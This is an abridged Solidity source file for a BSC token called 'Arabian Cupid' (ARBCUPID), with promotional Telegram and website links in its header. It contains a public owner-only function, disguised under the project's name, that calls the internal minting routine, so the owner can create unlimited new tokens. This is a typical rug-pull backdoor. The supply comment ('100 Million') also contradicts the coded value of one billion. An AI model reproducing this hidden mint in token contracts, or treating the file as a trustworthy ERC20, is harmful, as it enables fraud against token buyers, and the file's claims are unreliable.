...
//
// $ArabianCupid proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ArabianCupidBSC
// 📱 Website ::https://arabiancupid.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ArabianCupid(uint256 amount) public onlyOwner {
 _ArabianCupid(msg.sender, amount);
    }
    ...
    function _ArabianCupid(address account, uint256 amount) internal virtual {
...
contract $ArabianCupid is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Arabian Cupid", "ARBCUPID") {
     _ArabianCupid(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}